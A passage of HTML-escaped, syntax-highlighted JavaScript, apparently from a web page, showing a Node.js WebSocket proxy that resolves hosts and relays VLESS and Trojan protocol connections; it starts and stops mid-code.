&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;net.isIP&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; target&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;addresses&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; await dns.promises.lookup&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;target, &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; all: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;preferred&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addresses.find&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; a.family &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; addresses&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;preferred?.address&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; preferred.address&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    // fall through to custom DNS servers
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;resolver&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; new dns.promises.Resolver&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const server of DNS_SERVERS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      resolver.setServers&lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;server&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; await resolver.resolve4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v4?.&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; v4&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      resolver.setServers&lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;server&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; await resolver.resolve6&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v6?.&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; v6&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  throw new Error&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;Failed to resolve &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// VLE-SSå¤„ç†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; handleVlessConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;VERSION&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1, 17&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!id.every&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;v, i&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; parseInt&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;uuid.substr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i * 2, 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, 16&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;17, 18&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt8&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; + 19&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt8&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ? msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ? new TextDecoder&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;.decode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i + 1, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; + msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, i + 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.readUInt8&lt;span class=&#34;o&#34;&gt;()))&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ATYP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ? msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i, &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.reduce&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;s, b, i, a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i % &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ? s.concat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;a.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i - 1, i + 1&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; : s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;[])&lt;/span&gt;.map&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; b.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;16&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; : &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ws.send&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;new Uint8Array&lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;VERSION, 0&lt;span class=&#34;o&#34;&gt;]))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;duplex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; createWebSocketStream&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resolveHost&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    .then&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;resolvedIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host: resolvedIP, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    .catch&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; true&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Tro-janå¤„ç†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; handleTrojanConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.length &amp;lt; 58&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;receivedPasswordHash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 56&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;possiblePasswords&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      UUID,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;matchedPassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; null&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
